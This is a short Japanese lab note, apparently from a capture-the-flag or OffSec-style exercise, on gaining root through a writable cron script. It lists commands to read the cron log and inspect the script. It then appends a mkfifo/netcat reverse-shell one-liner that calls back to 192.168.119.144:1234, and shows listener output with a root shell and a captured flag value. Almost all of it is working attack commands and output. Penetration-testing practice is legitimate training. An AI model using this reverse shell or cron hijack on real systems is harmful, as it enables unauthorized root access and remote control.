# Cron

* CRONのログを確認する

  ```
  grep "CRON" /var/log/cron.log
  
  ---
  student@debian:~$ grep "CRON" /var/log/cron.log
  Jan  5 20:35:01 debian CRON[1810]: (root) CMD (/var/scripts/user_backups.sh)
  Jan  5 20:35:01 debian CRON[1809]: (CRON) info (No MTA installed, discarding output)
  ----
  ```

* CRONの中身とパーミッションを確認する

  ```bash
  cat /var/scripts/user_backups.sh
  ls -lah /var/scripts/user_backups.sh
  ```

* CRONファイルにシェルを追加する

  ```
  echo >> user_backups.sh 
  echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.119.144 1234 >/tmp/f" >> user_backups.sh
  cat user_backups.sh
  ```

* リバースシェルを待機する

  ```
  ┌──(kali㉿kali)-[~]
  └─$ nc -lvnp 1234                                                                                         
  listening on [any] 1234 ...
  connect to [192.168.119.144] from (UNKNOWN) [192.168.144.44] 38994
  /bin/sh: 0: can't access tty; job control turned off
  # whoami
  root
  ```

  ```
  ┌──(kali㉿kali)-[~]
  └─$ nc -lnvp 1234                                                                                         
  listening on [any] 1234 ...
  connect to [192.168.119.144] from (UNKNOWN) [192.168.144.52] 57050
  /bin/sh: 0: can't access tty; job control turned off
  # whoami
  root
  # pwd
  /root
  # ls 
  flag.txt
  # cat flag.txt
  OS{d24b71150457badfb66faf56e9b4b261}
  ```
  
  